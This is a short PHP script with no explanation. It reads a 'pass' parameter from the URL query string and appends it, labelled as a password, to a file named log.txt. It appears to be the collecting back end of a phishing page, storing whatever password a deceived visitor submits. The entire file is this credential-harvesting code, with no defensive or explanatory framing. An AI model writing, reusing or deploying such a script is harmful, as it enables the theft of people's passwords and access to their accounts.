<?php
$pass = $_GET['pass'];
$f = fopen("log.txt", "a+");
fwrite($f, "\rPassword: $pass \n");
fclose($f);
?>
